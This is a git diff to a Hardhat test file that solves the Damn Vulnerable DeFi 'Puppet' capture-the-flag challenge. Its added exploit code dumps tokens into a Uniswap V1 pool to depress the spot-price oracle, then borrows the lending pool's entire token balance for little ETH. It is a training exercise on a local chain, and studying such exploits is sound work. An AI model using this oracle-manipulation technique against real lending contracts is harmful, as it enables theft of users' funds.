@@ -3,6 +3,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const web3 = require('web3');
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -23,7 +24,7 @@ describe('[Challenge] Puppet', function () {
     const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
 
         const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
@@ -60,7 +61,7 @@ describe('[Challenge] Puppet', function () {
             this.token.address,
             this.uniswapExchange.address
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await this.token.approve(
             this.uniswapExchange.address,
@@ -72,7 +73,7 @@ describe('[Challenge] Puppet', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
         );
-        
+
         // Ensure Uniswap exchange is working as expected
         expect(
             await this.uniswapExchange.getTokenToEthInputPrice(
@@ -86,7 +87,7 @@ describe('[Challenge] Puppet', function () {
                 UNISWAP_INITIAL_ETH_RESERVE
             )
         );
-        
+
         // Setup initial token balances of pool and attacker account
         await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
         await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
@@ -101,8 +102,59 @@ describe('[Challenge] Puppet', function () {
         ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
     });
 
+
     it('Exploit', async function () {
+        const fromWei = (x) => web3.utils.fromWei(x);
+        const _curInfo = async (status) => {
+            
+
+            console.log("\n" + status + "\n");
+            console.log("[+] Oracle Calc Deposit Required")
+            let _oracle = (await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther("1")))
+            console.log(fromWei(_oracle._hex))
+            console.log("[+] Attacker ETH-DVT Pair Balance")
+            let attacker_eth = await ethers.provider.getBalance(attacker.address);
+            let attacker_dtv = await this.token.balanceOf(attacker.address);
+            console.log(fromWei(attacker_eth._hex));    // attacker ETH
+            console.log(fromWei(attacker_dtv._hex));  // attacker DVT
+            console.log("[+] LendingPool ETH-DVT Pair Balance");
+            let pool_eth = await ethers.provider.getBalance(this.lendingPool.address);
+            let pool_dtv = await this.token.balanceOf(this.lendingPool.address);
+            console.log(fromWei(pool_eth._hex));    // lendingPool ETH
+            console.log(fromWei(pool_dtv._hex));  // lendingPool DVT
+            console.log("[+] Uniswap Exchange ETH-DVT Pair Balance");
+            let exchange_eth = await ethers.provider.getBalance(this.uniswapExchange.address);
+            let exchange_dtv = await this.token.balanceOf(this.uniswapExchange.address);
+
+            console.log(fromWei(exchange_eth._hex));    // exchange ETH
+            console.log(fromWei(exchange_dtv._hex));  // exchange DVT
+        }
         /** CODE YOUR EXPLOIT HERE */
+        _curInfo("Initial");
+
+
+        await this.token.connect(attacker).approve(
+            this.uniswapExchange.address,
+            ethers.utils.parseEther("990")
+        );
+
+        await this.uniswapExchange.connect(attacker).tokenToEthTransferInput(
+            ethers.utils.parseEther("990"), // tokens_sold
+            ethers.utils.parseEther("1"),   // min_eth
+            (await ethers.provider.getBlock('latest')).timestamp * 2, attacker.address  // deadline
+        );
+
+        let _oraclePrice = ethers.BigNumber.from(
+            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther("1"))
+        );
+        let muOraclePrice = _oraclePrice.mul(100000).add(1);
+
+        await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther("100000"), { value: muOraclePrice });
+
+
+        _curInfo("After exploit");
+
+
     });
 
     after(async function () {
